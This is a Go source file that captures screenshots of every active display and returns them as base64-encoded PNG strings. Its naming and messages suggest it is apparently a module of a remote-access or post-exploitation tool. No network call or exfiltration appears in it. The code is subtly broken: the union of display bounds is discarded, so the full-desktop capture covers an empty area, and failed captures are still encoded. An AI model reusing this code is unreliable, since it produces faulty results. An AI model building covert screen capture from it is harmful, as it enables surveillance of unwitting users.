package zoo

import (
  "os"
  "fmt"
  "bytes"
  "image"
  "image/png"
  "encoding/base64"

  "odin/lib/utils"

  "github.com/kbinani/screenshot"
)

type SI struct {
  Screenshot string
  Done bool
}

type ScreenShots struct{
  SCS []SI
}

func Save(img *image.RGBA,filePath string){
  file,err := os.Create(filePath + utils.RandString(7) + ".png")
  if err != nil{
    fmt.Println("[-]    Unable to create image file: ",err)
  }
  defer file.Close()
  png.Encode(file,img)
}

func DecodeImage(encoded string) (*image.RGBA, error) {
  fmt.Println(encoded)
  decoded, err := base64.StdEncoding.DecodeString(encoded)
  if err != nil {
    return nil, fmt.Errorf("Failed to decode image: %v", err)
  }
  img, err := png.Decode(bytes.NewReader(decoded))
  if err != nil {
    return nil, fmt.Errorf("Failed to decode PNG: %v", err)
  }
  rgbaImg := img.(*image.RGBA)
  return rgbaImg, nil
}

func SaveToString(img *image.RGBA) (string, error) {
  var buf bytes.Buffer
  if err := png.Encode(&buf, img); err != nil {
    return "", fmt.Errorf("Failed to encode image: %v", err)
  }
  return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
}

func TakeScreenShot() (*ScreenShots){
  var scis []SI
  var rp = "No Active display found"
  n := screenshot.NumActiveDisplays()
  if n <= 0{
    var val = SI{
      Screenshot: rp,
      Done: false,
    }
    return &ScreenShots{
      SCS: append(scis,val),
    }
  }
  var all image.Rectangle = image.Rect(0,0,0,0)
  for i := 0; i < n; i++{
    bounds := screenshot.GetDisplayBounds(i)
    bounds.Union(all)
    img, err := screenshot.CaptureRect(bounds)
    if err != nil {
      var val = SI {
        Screenshot: fmt.Sprintf("%v",err),
        Done: false,
      }
      scis = append(scis,val)
      continue
    }
    str,err := SaveToString(img)
    if err != nil{
      var val = SI {
        Screenshot: fmt.Sprintf("%v",err),
        Done: false,
      }
      scis = append(scis,val)
      continue
    }
    var encd = SI {
      Screenshot: str,
      Done: true,
    }
    scis = append(scis,encd)
    /*fmt.Sprintf("%s",str)
    fmt.Println("")
    dcd,err := DecodeImage(str)
    if err != nil{
      return err,false
    }
    Save(dcd,fileName)
    fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)*/
  }
  //capture the whole desktop region into an image
  //fmt.Printf("%v\n",all)
  img,err := screenshot.Capture(all.Min.X,all.Min.Y,all.Dx(),all.Dy())
  if err != nil{
    var val = SI {
      Screenshot: fmt.Sprintf("%v",err),
      Done: false,
    }
    scis = append(scis,val)
  }
  str,err := SaveToString(img)
  if err != nil{
    var val = SI {
      Screenshot: fmt.Sprintf("%v",err),
      Done: false,
    }
    scis = append(scis,val)
  }
  var final = SI {
    Screenshot: str,
    Done: true,
  }
  scis = append(scis,final)
  return &ScreenShots{SCS:scis}
}
